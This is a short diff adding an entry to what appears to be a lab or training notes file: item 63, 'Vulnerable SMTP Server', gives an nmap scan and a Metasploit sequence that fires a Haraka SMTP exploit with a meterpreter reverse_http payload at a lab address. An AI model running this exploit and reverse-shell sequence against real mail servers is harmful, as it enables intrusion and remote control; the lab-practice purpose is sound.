@@ -1175,7 +1175,19 @@ exploit
 sessions -i 1
 id
 ```
-63)
+63)  Vulnerable SMTP Server
+
+```
+nmap -sS -sV 192.3.161.3
+use exploit/linux/smtp/haraka
+set SRVPORT 9898
+set email_to root@attackdefense.test
+set payload linux/x64/meterpreter_reverse_http
+set rhost 192.150.137.3
+set LHOST 192.150.137.2
+exploit
+
+```
 
 
 
